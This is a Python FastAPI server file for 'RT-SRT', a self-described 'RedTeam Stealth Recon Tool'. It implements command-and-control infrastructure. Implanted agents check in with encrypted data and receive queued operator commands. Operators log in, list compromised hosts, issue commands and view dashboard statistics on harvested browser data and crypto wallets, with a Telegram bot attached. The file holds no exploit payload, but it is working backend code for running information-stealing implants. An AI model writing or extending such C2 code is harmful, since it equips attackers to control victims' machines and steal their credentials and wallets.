"""
FastAPI web application for RT-SRT
"""

import asyncio
import logging
from contextlib import asynccontextmanager
from typing import List, Optional, Dict, Any
from datetime import datetime, timedelta

from fastapi import FastAPI, Depends, HTTPException, status, WebSocket, WebSocketDisconnect
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

from ..config import settings
from ..bot.bot import telegram_bot
from ..utils.db_utils import (
    db, get_dashboard_stats, AgentRepository, LogRepository,
    CommandRepository, init_database, get_or_create_agent
)
from ..utils.encryption import encryption_manager
from ..models.user_model import UserManager
from ..models.log_model import User, Agent, Log, Command

logger = logging.getLogger(__name__)

# Pydantic models for API
class LoginRequest(BaseModel):
    username: str
    password: str

class LoginResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"
    user: dict

class AgentResponse(BaseModel):
    id: int
    agent_id: str
    hostname: str
    ip_address: str
    os_info: Optional[str]
    last_seen: datetime
    is_active: bool

class LogResponse(BaseModel):
    id: int
    agent_id: int
    timestamp: datetime
    log_type: str
    items_count: int
    is_processed: bool

class CommandRequest(BaseModel):
    agent_id: str
    command_type: str
    parameters: Optional[Dict[str, Any]] = {}

class StatsResponse(BaseModel):
    agents: dict
    logs: dict
    browser_data: dict
    crypto_wallets: dict


# Security
security = HTTPBearer()


async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> User:
    """Get current user from JWT token"""
    token = credentials.credentials
    user_id = UserManager.verify_access_token(token)
    
    if not user_id:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired token"
        )
    
    with db.get_session() as session:
        user = session.query(User).get(user_id)
        if not user or not user.is_active:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="User not found or inactive"
            )
        
        return user


# WebSocket connection manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []
    
    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)
    
    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)
    
    async def broadcast(self, message: dict):
        """Broadcast message to all connected clients"""
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception:
                # Remove dead connections
                self.active_connections.remove(connection)


manager = ConnectionManager()


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Application lifespan manager"""
    # Startup
    logger.info("Starting RT-SRT server...")
    
    # Initialize database
    init_database()
    
    # Start Telegram bot
    asyncio.create_task(telegram_bot.start())
    
    yield
    
    # Shutdown
    logger.info("Shutting down RT-SRT server...")
    await telegram_bot.stop()


# Create FastAPI app
app = FastAPI(
    title="RT-SRT API",
    description="RedTeam Stealth Recon Tool API",
    version=settings.app_version,
    lifespan=lifespan
)

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.allowed_origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# Authentication endpoints
@app.post("/api/auth/login", response_model=LoginResponse)
async def login(request: LoginRequest):
    """Login endpoint"""
    with db.get_session() as session:
        user = session.query(User).filter_by(username=request.username).first()
        
        if not user or not UserManager.verify_password(request.password, user.password_hash):
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid username or password"
            )
        
        if not user.is_active:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="User account is disabled"
            )
        
        # Update last login
        user.last_login = datetime.utcnow()
        session.commit()
        
        # Create access token
        access_token = UserManager.create_access_token(user.id)
        
        return LoginResponse(
            access_token=access_token,
            user=user.to_dict()
        )


@app.get("/api/auth/me")
async def get_current_user_info(current_user: User = Depends(get_current_user)):
    """Get current user information"""
    return current_user.to_dict()


# Agent endpoints
@app.get("/api/agents", response_model=List[AgentResponse])
async def get_agents(
    active_only: bool = True,
    current_user: User = Depends(get_current_user)
):
    """Get list of agents"""
    with db.get_session() as session:
        if active_only:
            agents = AgentRepository.get_active_agents(session)
        else:
            agents = session.query(Agent).all()
        
        return [
            AgentResponse(
                id=agent.id,
                agent_id=agent.agent_id,
                hostname=agent.hostname,
                ip_address=agent.ip_address,
                os_info=agent.os_info,
                last_seen=agent.last_seen,
                is_active=agent.is_active
            )
            for agent in agents
        ]


@app.get("/api/agents/{agent_id}")
async def get_agent_details(
    agent_id: str,
    current_user: User = Depends(get_current_user)
):
    """Get agent details"""
    with db.get_session() as session:
        agent = session.query(Agent).filter_by(agent_id=agent_id).first()
        
        if not agent:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Agent not found"
            )
        
        # Get recent logs
        recent_logs = LogRepository.get_recent_logs(
            session, limit=10, agent_id=agent.id
        )
        
        # Get pending commands
        pending_commands = CommandRepository.get_pending_commands(
            session, agent.id
        )
        
        return {
            "agent": agent.to_dict(),
            "recent_logs": [log.to_dict() for log in recent_logs],
            "pending_commands": [cmd.to_dict() for cmd in pending_commands]
        }


# Log endpoints
@app.get("/api/logs", response_model=List[LogResponse])
async def get_logs(
    limit: int = 100,
    log_type: Optional[str] = None,
    agent_id: Optional[str] = None,
    current_user: User = Depends(get_current_user)
):
    """Get logs with filters"""
    with db.get_session() as session:
        # Convert agent_id to internal id
        internal_agent_id = None
        if agent_id:
            agent = session.query(Agent).filter_by(agent_id=agent_id).first()
            if agent:
                internal_agent_id = agent.id
        
        logs = LogRepository.get_recent_logs(
            session, 
            limit=limit,
            log_type=log_type,
            agent_id=internal_agent_id
        )
        
        return [
            LogResponse(
                id=log.id,
                agent_id=log.agent_id,
                timestamp=log.timestamp,
                log_type=log.log_type,
                items_count=log.items_count,
                is_processed=log.is_processed
            )
            for log in logs
        ]


@app.get("/api/logs/{log_id}")
async def get_log_details(
    log_id: int,
    current_user: User = Depends(get_current_user)
):
    """Get log details"""
    with db.get_session() as session:
        log = session.query(Log).get(log_id)
        
        if not log:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Log not found"
            )
        
        return log.to_dict()


# Command endpoints
@app.post("/api/commands")
async def create_command(
    request: CommandRequest,
    current_user: User = Depends(get_current_user)
):
    """Create command for agent"""
    with db.get_session() as session:
        agent = session.query(Agent).filter_by(agent_id=request.agent_id).first()
        
        if not agent:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Agent not found"
            )
        
        command = CommandRepository.create_command(
            session,
            agent,
            request.command_type,
            request.parameters
        )
        
        # Notify via WebSocket
        await manager.broadcast({
            "type": "new_command",
            "agent_id": request.agent_id,
            "command": command.to_dict()
        })
        
        return command.to_dict()


# Statistics endpoint
@app.get("/api/stats", response_model=StatsResponse)
async def get_statistics(current_user: User = Depends(get_current_user)):
    """Get dashboard statistics"""
    stats = get_dashboard_stats()
    return StatsResponse(**stats)


# WebSocket endpoint for real-time updates
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket endpoint for real-time updates"""
    await manager.connect(websocket)
    
    try:
        while True:
            # Send heartbeat
            await asyncio.sleep(settings.ws_heartbeat_interval)
            await websocket.send_json({"type": "heartbeat"})
            
    except WebSocketDisconnect:
        manager.disconnect(websocket)


# Agent communication endpoint
@app.post("/api/agent/checkin")
async def agent_checkin(data: dict):
    """Agent check-in endpoint"""
    try:
        # Decrypt agent data
        decrypted = encryption_manager.decrypt_agent_data(data.get("data", ""))
        
        # Update agent status
        agent = get_or_create_agent(
            agent_id=decrypted.get("agent_id"),
            hostname=decrypted.get("hostname", "Unknown"),
            ip_address=decrypted.get("ip_address", "0.0.0.0"),
            **decrypted.get("system_info", {})
        )
        
        # Get pending commands
        with db.get_session() as session:
            agent_db = session.query(Agent).filter_by(agent_id=agent.agent_id).first()
            commands = CommandRepository.get_pending_commands(session, agent_db.id)
            
            # Mark commands as sent
            for cmd in commands:
                CommandRepository.mark_sent(session, cmd.id)
            
            # Prepare response
            response_data = {
                "commands": [cmd.to_dict() for cmd in commands],
                "config": {
                    "check_interval": 300,  # 5 minutes
                    "upload_endpoint": "/api/agent/upload"
                }
            }
            
            # Encrypt response
            encrypted_response = encryption_manager.encrypt_response(response_data)
            
            return {"data": encrypted_response}
            
    except Exception as e:
        logger.error(f"Agent check-in error: {e}")
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid request"
        )


# Health check
@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "version": settings.app_version,
        "timestamp": datetime.utcnow().isoformat()
    }


# Main entry point
if __name__ == "__main__":
    import uvicorn
    
    # Setup logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Run server
    uvicorn.run(
        "app:app",
        host=settings.host,
        port=settings.port,
        reload=settings.debug,
        workers=settings.workers
    )